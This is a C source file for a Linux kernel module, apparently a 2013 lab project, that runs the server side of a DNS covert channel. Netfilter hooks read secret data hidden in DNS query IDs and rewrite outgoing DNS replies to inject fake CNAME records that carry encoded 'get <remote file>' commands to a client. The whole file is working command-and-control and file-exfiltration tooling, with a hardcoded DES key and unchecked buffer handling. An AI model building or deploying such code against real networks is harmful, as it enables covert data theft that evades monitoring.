/*
 * onlab-kernel-srv.c
 *
 * Kernel module for dns covert channel  / server side
 * This module should be loaded on the controlled host, which has the recursive dns
 *
 * Copyright (C) 2013 by Tamas Varga
 *
 */
#undef __KERNEL__
#define __KERNEL__

#undef MODULE
#define MODULE
/* kernel */
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/init.h>
#include <net/ip.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/in.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/etherdevice.h>
#include <linux/list.h>
#include "dnscc.h"
#include "messages/dnscc_msg.h"
#include "messages/get_file_msg.h"
#include "lib/modp_b64w.c"
/* */
/* Def */
#define UDP_HDR_LEN 8
#define DNS_PORT 53
#define NETLINK_USER 31
/* statics */
static struct nf_hook_ops nfho_send,nfho_recv;
struct DNS_HEADER {
	uint16_t	query_id;
	uint16_t	flags;
	uint16_t	qdcount;
	uint16_t	ancount;
	uint16_t	nscount;
	uint16_t	arcount;
};
struct DNS_QUERY {
	unsigned char 	*name;
	struct QUESTION	*ques;
};
struct QUESTION
{
	uint16_t	qtype;
	uint16_t	qclass;
};
struct RR
{
	unsigned char 	*name;
	struct RR_DATA	*rr_data;
	unsigned char	*rdata;
};

//Struct align with fake bytes ...
#pragma pack(push,1)
struct RR_DATA{
	uint16_t	type;
	uint16_t	class;
	uint32_t	ttl;
	uint16_t	rdlength;
};
#pragma pack(pop)
/* List for filtering outgoing dns reply packets */ 
/* Sending command with the cli client
 * 1, CLI sends a netlink message to kernel module
 * 2, Validate message, and make a connection enrty in conn_out_list
 * 3, Every outgoing dns client response will be matched against conn_out_list
 * 4, After match found, the original packet will be replaced with a fake CNAME dns reply
 * 5, Client will query that fake CNAME, then we send out the original reply
 */
struct conn_out_data{
	uint32_t ip_addr;
	uint16_t stage;//see #define
	unsigned char* command;
	struct list_head list;
};

struct conn_out_data conn_out_list;

/* Struct for identifying a connection in the linked list */
struct conn_in_data{
	uint32_t ip_addr;
	uint32_t connection_id;
	unsigned char buff[1024];
	uint16_t count;
	struct list_head list;
};

struct conn_in_data conn_in_list;

/* Ugly hack. This netlink pid should be assigned to conn_id_data */
static u32 netlink_pid;

/* Netlink socket for communication between this module and the user space C&C client */

struct sock *nl_sk = NULL;

/* Our netlink function */
static void dnscc_nl_recv_msg(struct sk_buff *skb){
	struct nlmsghdr *nlh;
	dnscc_msg* msg;
	/* decode received message */
	nlh = (struct nlmsghdr *)skb->data;
	msg = (dnscc_msg*) nlmsg_data(nlh);
	switch(msg->type){
		case 1: {
				struct conn_out_data* c;
				unsigned char command[256] = "get";
				unsigned char* enc_command;
			        uint16_t rf_len = 0;
				int len = 0;
				/* save netlink pid */
				netlink_pid = nlh->nlmsg_pid;
				get_file_msg* gfmsg = msg->data;
				rf_len = strlen((const char*)gfmsg->remote_file)+1;
				printk(KERN_INFO"remote file length %d",rf_len);
				enc_command = (unsigned char*)kmalloc(sizeof(unsigned char)*(rf_len+256),GFP_DMA);
				printk(KERN_INFO "[DNSCC] Netlink get file message IP: %pI4 Remote File: %s ", &gfmsg->ip, gfmsg->remote_file);
				strcat(command,gfmsg->remote_file);
				printk(KERN_INFO"Command %s",command);
				len = modp_b64w_encode(enc_command,command,rf_len+3);
				printk(KERN_INFO"enc command %s %d len",enc_command,len);
				c = kmalloc(sizeof(*c), GFP_DMA);
				c->ip_addr = gfmsg->ip.s_addr;
				c->command = enc_command;
				INIT_LIST_HEAD(&c->list);
				list_add(&c->list,&conn_out_list.list);
				break;
			}
		default:
			printk(KERN_INFO "[DNSCC] Netlink message, unknown type %d ", msg->type);
			break;
	}
}

/* Connection helpers */
/* Generate an unique connection identifier using the source IP, and the source port
 * and store it in the connection_list 
 * TODO: is there any chance of generating NULL as unique id?
 */
struct conn_in_data* generate_connection_id(uint32_t ip_addr, uint16_t sport,uint8_t data){
	struct conn_in_data* c;
	printk(KERN_DEBUG "[DNSCC] Generating new connection id");
	c = kmalloc(sizeof(*c), GFP_DMA);
	c->count = 0;
	c->ip_addr = ip_addr;
	c->connection_id = ip_addr ^ sport;
	c->buff[c->count] = data;
	c->count++;
	INIT_LIST_HEAD(&c->list);
	list_add(&c->list,&conn_in_list.list);
	return c;
}

struct conn_in_data* add_connection_data(struct conn_in_data* c,uint8_t data){
	if(c != NULL){
	//	printk(KERN_DEBUG "[DNSCC] Match found! Adding connection data to %u -> %x", c->connection_id,data);
	        c->buff[c->count] = data;
		c->count++;
		return c;
	}
	return NULL;
}

/* Check the linked list, and return the connection identifier 
 * If not exists, then return 0
 * */
struct conn_in_data* check_connection_exists(uint32_t ip_addr){
	uint32_t ret;
	struct conn_in_data* c;
	ret = 0;
	list_for_each_entry(c,&conn_in_list.list,list){
		if(c->ip_addr == ip_addr){
			printk(KERN_DEBUG "[DNSCC] Match found! Connection id: %u", c->connection_id);
			return c;
		}
	}
	return NULL;
}

/* Remove the connection from linked list and return the connection id*/
uint32_t remove_connection(uint32_t ip_addr){
	uint32_t ret;
	struct conn_in_data *c,*temp;
	ret = 0;
	list_for_each_entry_safe(c,temp,&conn_in_list.list,list){
		if(c->ip_addr == ip_addr){
			struct nlmsg_hdr *nlh_new;
                        int msg_size = strlen((const char*)c->buff);
                        int res;
			ret = c->connection_id;
			printk(KERN_INFO "[DNSCC] Match found, removing %u connection from list!", ret);
			printk(KERN_INFO "[DNSCC] Connection data is \n  %s",c->buff);
			struct sk_buff *skb_out;
                        skb_out = nlmsg_new(msg_size,0);
                        if(!skb_out){
                                printk(KERN_INFO"[DNSCC] Failed to allocate skb_out");
                        }
                        nlh_new = nlmsg_put(skb_out,0,0,NLMSG_DONE,msg_size,0);
                        NETLINK_CB(skb_out).dst_group = 0;
                        memcpy(nlmsg_data(nlh_new),c->buff,msg_size);
                        res = nlmsg_unicast(nl_sk,skb_out,netlink_pid);
                        if(res < 0) {
                                printk(KERN_INFO "[DNSCC] Failed to send back nl message");
                        }
                        printk(KERN_INFO"[DNSCC] Netlink message sent \n");			
			list_del(&c->list);
			kfree(c);
		}
	}
	return ret;


}

/* Out conn helpers */
/* Check if we need to send command to this ip 
 * if yes, return 1, else 0
 * */
uint16_t check_command_exists(uint32_t ip_addr){
	uint16_t ret;
	struct conn_out_data* c;
	ret = 0;
	list_for_each_entry(c,&conn_out_list.list,list){
		if(c->ip_addr == ip_addr){
			printk(KERN_DEBUG "[DNSCC] Match found! Command for %pI4",&ip_addr);
			ret = 1;
		}
	
	}
	return ret;
}
/* Get the command for the given IP * */
unsigned char* get_command(uint32_t ip_addr){
	struct conn_out_data* c;
	list_for_each_entry(c,&conn_out_list.list,list){
		if(c->ip_addr == ip_addr){
			printk(KERN_DEBUG "[DNSCC] Command %s for %pI4",c->command,&ip_addr);
			return c->command;
		}
	
	}
	return NULL;
}
/* remove the command from list */
uint8_t remove_command(uint32_t ip_addr){
	struct conn_out_data* c;
	list_for_each_entry(c,&conn_out_list.list,list){
		if(c->ip_addr == ip_addr){
			printk(KERN_DEBUG "[DNSCC] Removing command %s for %pI4 ",c->command,&ip_addr);
			list_del(&c->list);
			kfree(c);
			return 1;
		}
	
	}
	return 0;
}
//correct name pointers
unsigned char* correct_name_ptr(unsigned long writer, unsigned char* buffer, int* count, uint16_t ptr_offset, uint16_t ar_start)
{
	unsigned int jumped=0,offset;
	uint16_t new_offset = 0;
	unsigned char* read = &buffer[writer];
	*count = 1;
	while(*read!=0)
	{
		if(*read>=192)
		{
			offset = (*read)*256; //49152 = 11000000 00000000 ;)
			printk(KERN_INFO"OFFSET : %d ",offset);
			offset += *(read+1); //49152 = 11000000 00000000 ;)
			printk(KERN_INFO"OFFSET : %d ",offset);
			offset -=49152; //49152 = 11000000 00000000 ;)
			printk(KERN_INFO"OFFSET : %d ",offset);

			// if offset > answer_start , then we should correct it!
			if(offset > ar_start){
				printk(KERN_INFO"Correcting pointer before -> %x %x %lu",*read,*(read+1),writer);
				new_offset = offset + ptr_offset+49152;
				new_offset = htons(new_offset);
				printk(KERN_INFO"Correcting pointer before -> %d %d %lu",offset,new_offset,writer);
				memcpy(&buffer[writer],&new_offset,sizeof(uint16_t));
				offset = (*read)*256 + *(read+1) - 49152; //49152 = 11000000 00000000 ;)
				printk(KERN_INFO"Correcting pointer after -> %x %x %d",*(read),*(read+1),offset);
			}
			writer = offset;
			read = &buffer[writer];
			jumped = 1; //we have jumped to another location so counting wont go up!
		}
		writer = writer+1;
		read = read + 1; 
		if(jumped==0){
			*count = *count + 1; //if we havent jumped to another location then we can count up
		}
	}
	if(jumped==1)
	{
		*count = *count + 1; //number of steps we actually moved forward in the packet
	}
	return "ok";
}

//TODO:Removeme static const uint16_t port = 53;
// source : http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
unsigned char* read_dns_name(unsigned char* reader, unsigned char* buffer, int* count)
{
	unsigned char *name;
	unsigned int p=0,jumped=0,offset;
	int i , j;
	*count = 1;
	name = (unsigned char*)kmalloc(256,GFP_DMA);
	name[0]='\0';
	//read the names in 3www6google3com format
	while(*reader!=0)
	{
		if(*reader>=192)
		{
			offset = (*reader)*256 + *(reader+1) - 49152; //49152 = 11000000 00000000 ;)
			reader = buffer + offset - 1;
			jumped = 1; //we have jumped to another location so counting wont go up!
		}else{
			name[p++]=*reader;
		}
		reader = reader+1;
		if(jumped==0){
			*count = *count + 1; //if we havent jumped to another location then we can count up
		}
	}
	name[p]='\0'; //string complete
	if(jumped==1)
	{
		*count = *count + 1; //number of steps we actually moved forward in the packet
	}
	//now convert 3www6google3com0 to www.google.com
	for(i=0;i<(int)strlen((const char*)name);i++){
		p=name[i];
		for(j=0;j<(int)p;j++){
			name[i]=name[i+1];
			i=i+1;
		}
		name[i]='.';
	}
	name[i-1]='\0'; //remove the last dot
	
	//TODO:debug 
	//printk(KERN_DEBUG"[DNSCC] Read dns name %s",name);
	return name;
}

/* we do not want to inser a command between domain.tld and A record so return 0 if we find only 1 dot in the question */

uint8_t can_manipulate_dns_reply(unsigned char* dns_name){
	int i;
	int dot_found = 0;
        for(i=0;i<strlen(dns_name);i++){
                if(dns_name[i] == '.'){
                        dot_found++;
                }
        }
	if(dot_found >= 2){
		return 1;
	}else{
		return 0;
	}

}

/* Insert a fake cname betweek question_domain <-> A record */
uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsigned char* new_dns_data,uint16_t orig_len){
	struct DNS_HEADER *dns_h,*ndns_h;
	unsigned char *qname, *nqname;
	unsigned char* dns_name;
	unsigned char *dpointer,*nspointer;
        struct RR ar[10],*new_ar,*olda_ar;
	int temp;  // domain name reader temp var
	int dnsn_count;//question dns name count
	int i,j,ip_ar_num = 0;
	unsigned long writer = 0;
	unsigned long old_aur_start = 0;//count how many bytes from dns start-> auth RR, so we can correct pointers
	uint16_t pointer_correct = 0;
	uint16_t cname_offset = 0;
	uint16_t cname2_offset = 0;
	uint8_t command_length = 0;
	struct RR fake_rr;
	int com_len;
	int last_dot;



	temp =0;
	dns_h =	(struct DNS_HEADER*)data;
	dns_name = read_dns_name(&data[sizeof(struct DNS_HEADER)],data,&dnsn_count); 
	qname =(unsigned char*)&data[sizeof(struct DNS_HEADER)];
	
        dpointer = &data[sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION)];
	old_aur_start = sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION);
	/* read answers */
	/* parse the answer RRs */
	printk(KERN_INFO "[DNSCC] Modify dns packet - dns ans count: %d", ntohs(dns_h->ancount));
	for(i=0;i<ntohs(dns_h->ancount);i++){
		ar[i].name = read_dns_name(dpointer,data,&temp);
		old_aur_start += temp;
		dpointer = dpointer + temp;//move reader to the end of the name 
		ar[i].rr_data = (struct RR_DATA*)(dpointer);
		dpointer = dpointer + sizeof(struct RR_DATA);
		old_aur_start += sizeof(struct RR_DATA);	
		// If it's an IPV4 and A record, then we need it :)
		if(ntohs(ar[i].rr_data->type) == 1){
			ar[i].rdata = (unsigned char*)kmalloc(ntohs(ar[i].rr_data->rdlength),GFP_DMA);
			for(j=0;j<ntohs(ar[i].rr_data->rdlength);j++){
				ar[i].rdata[j] = dpointer[j];
				printk(KERN_INFO" ar data %x ",ar[i].rdata[j]);
			}	
//	                ar[i].rdata[ntohs(answers[i].resource->data_len)] = '\0';
			ip_ar_num = i;	
		}
		old_aur_start += ntohs(ar[i].rr_data->rdlength);
		dpointer = dpointer + ntohs(ar[i].rr_data->rdlength);

	}

	nspointer = dpointer;
	/* Create fake answer rr record */
	com_len = strlen(command)+1;
	fake_rr.name = kmalloc(sizeof(unsigned char)*2,GFP_DMA);
	fake_rr.name[0] = 0xc0;
	fake_rr.name[1] = 0x0c;
	printk(KERN_INFO"fake comm %x - %x",ntohs(fake_rr.name[0]),ntohs(fake_rr.name[1]));
	fake_rr.rr_data = kmalloc(sizeof(struct RR_DATA),GFP_DMA);
	fake_rr.rr_data->type = htons(5);//cname
	fake_rr.rr_data->class = htons(1);
	fake_rr.rr_data->ttl = ar[ip_ar_num].rr_data->ttl;
	fake_rr.rr_data->rdlength = htons(com_len+2);
	fake_rr.rdata = command;
	/* put together the new dns packet */
	/* header */
	ndns_h = (struct DNS_HEADER *)new_dns_data;
	*ndns_h = *dns_h;			// use the old header
	writer += sizeof(struct DNS_HEADER);
	ndns_h->ancount = htons(2);
	ndns_h->nscount = htons(0);
	ndns_h->arcount = htons(0);
	/* qname */
	/* we should really use compression, so our fake cname will look like command.something.com
	 * get the place of the dot before the last one.
	 */
	cname_offset = 1;
	last_dot = 0;
	for(i=0;i<strlen(dns_name);i++){
//		printk(KERN_INFO" i=%d dns_name %c",i,dns_name[i]);
		if(dns_name[i] == '.'){
//			printk(KERN_INFO"Dot found %d ",i);
			cname_offset = last_dot+1;
			last_dot = i;
		}	
	}
	cname_offset += writer;
//	printk(KERN_INFO"cname_offset %d",cname_offset);
	nqname = (unsigned char *)&new_dns_data[writer];
	memcpy(nqname,qname,strlen((const char*)qname)+1+sizeof(struct QUESTION));	//use the original qname + question flags
	writer += strlen((const char*)qname)+1+sizeof(struct QUESTION);
//	printk(KERN_INFO"HEADER ------ writer %lu",writer);

	/* answer */
	new_ar = (struct RR *)&new_dns_data[writer];
	memcpy(new_ar,fake_rr.name,sizeof(unsigned char)*2);//first answer here, so inject our fake cname
//	printk(KERN_INFO"new ar %x %x",new_dns_data[writer],new_dns_data[writer+1]);
	writer += sizeof(unsigned char)*2;
	memcpy(&new_dns_data[writer],fake_rr.rr_data,sizeof(struct RR_DATA));
	writer += sizeof(struct RR_DATA);
	cname2_offset = writer + 49152;
//	printk(KERN_INFO" %zu comm length",strlen(command));
	command_length = strlen(command);
	memcpy(&new_dns_data[writer],&command_length,sizeof(uint8_t));//length octet
	writer += sizeof(uint8_t);
	memcpy(&new_dns_data[writer],command,strlen((const char*)command));//real command
	writer += strlen((const char*)command);
	/* inject offset */
	cname_offset += 49152;
	cname_offset = htons(cname_offset);
//	printk(KERN_INFO"before offset %x %x",new_dns_data[writer],new_dns_data[writer+1]);
	memcpy(&new_dns_data[writer],&cname_offset,sizeof(uint16_t));
//	printk(KERN_INFO"after offset %x %x",new_dns_data[writer],new_dns_data[writer+1]);
	writer += sizeof(uint16_t);
//	printk(KERN_INFO"CNAME - ----- writer %d",writer);
	/* and the valid A record */
	olda_ar = (struct RR *)&new_dns_data[writer];
	cname2_offset = htons(cname2_offset);
	memcpy(olda_ar,&cname2_offset,sizeof(uint16_t));//first answer here, so inject our fake cname
//	printk(KERN_INFO"new ar 2 %x %x %d",new_dns_data[writer],new_dns_data[writer+1],writer);
	writer += sizeof(uint16_t);
	memcpy(&new_dns_data[writer],ar[ip_ar_num].rr_data,sizeof(struct RR_DATA));
	writer += sizeof(struct RR_DATA);
	memcpy(&new_dns_data[writer],ar[ip_ar_num].rdata,ntohs(ar[ip_ar_num].rr_data->rdlength));
	writer += ntohs(ar[ip_ar_num].rr_data->rdlength);
//	printk(KERN_INFO"A record --------- writer %d",writer);

	/* correct pointers */
	pointer_correct = writer - old_aur_start; //assume that, our fake command will be longer :)
//	printk(KERN_INFO "Pointer correct %d writer: %d aur_old_start: %d",pointer_correct,writer,old_aur_start);

	/* copy other stuff */
/*
	memcpy(&new_dns_data[writer],dpointer,orig_len-old_aur_start);
	printk(KERN_INFO" copyed %d data writer now %d ",orig_len-old_aur_start,writer);
	//riter += orig_len-old_aur_start;
	old_answer_start = sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION);
	// correct pointers 
	for(i=0;i<ntohs(ndns_h->nscount);i++)
	{
		printk(KERN_INFO" ----------- %d AN record ---------",i);
		ar[i].name=correct_name_ptr(writer,new_dns_data,&temp,pointer_correct,old_answer_start);
		writer+=temp;
		printk(KERN_INFO"writer %d",writer);
		ar[i].rr_data=(struct RR_DATA*)&new_dns_data[writer];
		writer+=sizeof(struct RR_DATA);
		printk(KERN_INFO"writer %d",writer);
		ar[i].rdata=correct_name_ptr(writer,new_dns_data,&temp,pointer_correct,old_answer_start);
		writer+=ntohs(ar[i].rr_data->rdlength);
		printk(KERN_INFO"writer %d",writer);

	}
 
    //read additional
	for(i=0;i<ntohs(ndns_h->arcount);i++)
	{
		printk(KERN_INFO" ----------- %d AR record ---------",i);
		ar[i].name=correct_name_ptr(writer,new_dns_data,&temp,pointer_correct,old_answer_start);
		writer+=temp;
		printk(KERN_INFO"writer %d",writer);
		ar[i].rr_data=(struct RR_DATA*)&new_dns_data[writer];
        	writer+=sizeof(struct RR_DATA);
		printk(KERN_INFO"writer %d",writer);
		if(ntohs(ar[i].rr_data->type)!=1)
		{
			ar[i].rdata=correct_name_ptr(writer,new_dns_data,&temp,pointer_correct,old_answer_start);
		}
		writer+=ntohs(ar[i].rr_data->rdlength);
		printk(KERN_INFO"writer %d",writer);
	}
	*/
	
//	printk(KERN_INFO"[DNSCC] Manipulated answer size : %lu",writer);
	return writer;	
}


/*Receiver hook */
static unsigned int dnscc_recv(unsigned int hooknum, struct sk_buff* skb, const struct net_device* in, const struct net_device* out, int (*okfn)(struct sk_buff*)) {
	struct iphdr* iph = ip_hdr(skb);
	struct udphdr* udph = NULL, udpbuff;
	unsigned char *data = NULL,*dns_name;
	struct DNS_HEADER* dns_h = NULL;	/* if it's not udp, then return accept*/
	bool query_bit = false;
	int dnsn_count = 0;
	uint16_t d_id; // dns_id
	uint8_t action = 5;// dns_action. 5 because, it's invalid by default
	uint8_t secret_data;
	uint32_t connection_id;
	struct conn_in_data* c;
	/* parse dns packet */
	/* check if the packet is valid */
	/* parse IP header */
	if(iph->protocol != IPPROTO_UDP){
		return NF_ACCEPT;
	}
	/* udp header*/
	udph = skb_header_pointer(skb, ip_hdrlen(skb), sizeof(*udph) ,&udpbuff);
	if (!udph){
		return NF_ACCEPT;
	}
	/* We're receiving a question, so dst should be 53 */
	if(ntohs(udph->dest) != DNS_PORT){
		return NF_ACCEPT;
	}
	/* get dns packet */
	data = (unsigned char *) skb_header_pointer (skb, ip_hdrlen(skb)+UDP_HDR_LEN, 0, NULL);
	/* Better way? */
	dns_h = (struct DNS_HEADER*)data;	
	query_bit = (ntohs(dns_h->flags) & 0x8000) >> 15;
	/* DST port == DNS_PORT and dst mac == our mac address */
	if (!query_bit ) {
		unsigned char local_b[1024];
		dns_name = read_dns_name(&data[sizeof(struct DNS_HEADER)],data,&dnsn_count);
		d_id = dnscc_decrypt(ntohs(dns_h->query_id),iph,udph);
		printk(KERN_DEBUG "[DNSCC] Incoming DNS query packet id %u dns-name %s answer = %d \n",ntohs(dns_h->query_id),dns_name,query_bit);
		action = dnscc_get_action(d_id);
		secret_data = dnscc_get_data(d_id);
		/* Check if it's starting packet, or we already have a connection */
		connection_id = 0;
		if(action == 1){ // new connection
			c = generate_connection_id(iph->saddr,ntohs(udph->source),secret_data);
			printk(KERN_INFO "[DNSCC] New connection id generated %u",c->connection_id);
		}else if(action == 2){ // find the connection_id
			c = check_connection_exists(iph->saddr);
			if(c != NULL){
				add_connection_data(c,secret_data);
			}
		}else if(action == 3){// this is the last segment, remove the connection id
			c = check_connection_exists(iph->saddr);
			if(c != NULL){
				memcpy(&local_b,c->buff,strlen((const char*)c->buff));
//				printk(KERN_INFO"[DNSCC]  %s ",local_b);
				connection_id = remove_connection(iph->saddr);
			}
		}else{
			printk(KERN_INFO "[DNSCC] Invalid action id: %u", action);
		}
		if(c != NULL){
			printk(KERN_INFO "[DNSCC][DATA] %d  %u  %x ",c->connection_id,action,secret_data);
		}
		kfree(dns_name);
	}

	return NF_ACCEPT;
}


/* Sender hook */
static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const struct net_device* on, const struct net_device* out, int (*okfn)(struct sk_buff*)) {
	struct iphdr* iph = ip_hdr(skb);
	struct udphdr* udph = NULL;
	unsigned char *data = NULL,*dns_name;
	struct DNS_HEADER* dns_h = NULL;	/* if it's not udp, then return accept*/
	bool query_bit = false;
	int dnsn_count = 0;
	struct QUESTION *question_data;
	/* check if the packet is valid */
	/* parse IP header */
	if(iph->protocol != IPPROTO_UDP){
		return NF_ACCEPT;
	}

	/* udp header*/
	//udph = skb_header_pointer(skb, ip_hdrlen(skb), sizeof(*udph) ,&udpbuff);
	udph = udp_hdr(skb);
	if (!udph){
		return NF_ACCEPT;
	}
	/* We're sending an asnwer, so src should be 53 */
	if(ntohs(udph->source) != DNS_PORT){
		return NF_ACCEPT;
	}
	/* get dns packet */
	data = (unsigned char *) skb_header_pointer (skb, ip_hdrlen(skb)+UDP_HDR_LEN, 0, NULL);
	/* Better way? */
	dns_h = (struct DNS_HEADER*)data;	
	query_bit = (ntohs(dns_h->flags) & 0x8000) >> 15;
	/* SRC port == DNS_PORT and src mac == our mac address */
	if(query_bit ){
		dns_name = read_dns_name(&data[sizeof(struct DNS_HEADER)],data,&dnsn_count);	
	        question_data = (struct QUESTION*)&data[sizeof(struct DNS_HEADER)+dnsn_count+1];	
		printk(KERN_INFO "[DNSCC] Outgoing DNS answer packet id %u dns-name %s answer = %d \n",ntohs(dns_h->query_id),dns_name,query_bit);
		/* check if we need to send out a command to this client and the reply is an A record*/
//		printk(KERN_INFO"Check command %d qtype %d",check_command_exists(iph->daddr),ntohs(question_data->qtype==1));
		if(check_command_exists(iph->daddr) == 1 && ntohs(question_data->qtype == 1) && can_manipulate_dns_reply(dns_name) == 1){
			/* Manipulate the answer */
			unsigned char *command;
			unsigned char *orig_dns_data;
			unsigned char *new_dns_data;
			uint16_t new_dns_size;
			uint16_t payload_len = ntohs(udph->len) - UDP_HDR_LEN;
			int offset;
			int len;
                        unsigned int udplen;
			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
			command = get_command(iph->daddr);
			new_dns_size = sizeof(unsigned char)*payload_len + strlen((const char*)command+20) ;
			new_dns_data = kmalloc(new_dns_size,GFP_DMA);
			printk(KERN_INFO "1new dns size: %d ",new_dns_size);
			orig_dns_data = kmalloc(sizeof(unsigned char)*payload_len,GFP_DMA);
			skb_copy_bits(skb,skb->len - payload_len,orig_dns_data,payload_len); // copy data from skb
			/* new skb */
			printk(KERN_INFO "SKB DATA LEN %d",payload_len);
			new_dns_size = manipulate_dns_reply(orig_dns_data,command,new_dns_data,payload_len);
			memcpy(data,new_dns_data,new_dns_size);
			skb->len = skb->len - (payload_len) + new_dns_size;
			printk(KERN_INFO "2new dns size: %d ",new_dns_size);
			udph->len=htons(new_dns_size+8);
			printk(KERN_INFO" ip tot %d payload %d new dns %d",ntohs(iph->tot_len), payload_len , new_dns_size);
			iph->tot_len = htons(ntohs(iph->tot_len) - payload_len + new_dns_size);
			/* recalculate checksums */
			iph->check = 0;
	                ip_send_check (iph);
			udph->check = 0;
//	               	offset = skb_transport_offset(skb);
			skb->ip_summed = CHECKSUM_PARTIAL;
			offset = skb_transport_offset(skb);
	                udplen = skb->len - offset;
//			udplen = skb->len - (iph->ihl<<2);
			udph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr, udplen, IPPROTO_UDP, 0);
//			udph->check = csum_tcpudp_magic(iph->saddr, iph->daddr, udplen, IPPROTO_UDP, skb_checksum(skb, 0, udplen, 0));
//                        udph->check = csum_tcpudp_magic((iph->saddr), (iph->daddr), udplen, iph->protocol, csum_partial((char*)udph, udplen,0));
//
			/* remove the command */
			remove_command(iph->daddr);
		}
		kfree(dns_name);
		}
	return NF_ACCEPT;
}



/* Load and unload */
static __init int my_init(void){
	int cipher = 1;
	char des_key[8+1]="AAAAAAAA";
	/* create the netlink socket */
	nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, 0, dnscc_nl_recv_msg, NULL, THIS_MODULE);
	if(!nl_sk){
		printk(KERN_ALERT "[DNSCC] Error while creating netlink socket");
	}else{
		printk(KERN_DEBUG "[DNSCC] Netlink socket created");
	}
	/* cipher things */
	dnscc_crypt_init(cipher,des_key);
	nfho_send.hook 	= dnscc_send; 					//function to call
	nfho_send.hooknum 	= NF_INET_LOCAL_OUT;			//hook num in netfilter TODO: What if the packet is fragmented?
	nfho_send.pf		= NFPROTO_IPV4;				//IPV4
	nfho_send.priority	= NF_IP_PRI_FIRST;			//should be first priority
	nf_register_hook(&nfho_send);					//register netfilter hook
	printk(KERN_INFO "[DNSCC] dnscc_send kernel module loaded\n");
	nfho_recv.hook 	= dnscc_recv; 					//function to call
	nfho_recv.hooknum 	= NF_INET_PRE_ROUTING;			//hook num in netfilter TODO: What if the packet is fragmented?
	nfho_recv.pf		= NFPROTO_IPV4;				//IPV4
	nfho_recv.priority	= NF_IP_PRI_FIRST;			//should be first priority
	nf_register_hook(&nfho_recv);					//register netfilter hook
	printk(KERN_INFO "[DNSCC] dnscc_recv kernel module loaded\n");
	/* Create llist for identifying incoming connections */
	INIT_LIST_HEAD(&conn_in_list.list);
	INIT_LIST_HEAD(&conn_out_list.list);

	return 0;
}

static __exit void my_exit(void){
	struct conn_in_data *cin;
	struct conn_out_data *cout;
	struct conn_in_data *tmpin;
	struct conn_out_data *tmpout;
	/* release netlink socket */
	netlink_kernel_release(nl_sk);
	nf_unregister_hook(&nfho_send);				//unregister netfilter hook
	printk(KERN_INFO "[DNSCC] dnscc_send kernel module unloaded\n");
	nf_unregister_hook(&nfho_recv);				//unregister netfilter hook
	printk(KERN_INFO "[DNSCC] dnscc_recv kernel module unloaded\n");
	/* Remove all elements from conn_list */
	list_for_each_entry_safe(cin,tmpin,&conn_in_list.list, list){
		printk(KERN_DEBUG "[DNSCC] freeing node %u\n", cin->connection_id);
		list_del(&cin->list);
		kfree(cin);
	}
	list_for_each_entry_safe(cout,tmpout,&conn_out_list.list, list){
		list_del(&cout->list);
		kfree(cout);
	}
}

module_init(my_init);
module_exit(my_exit);
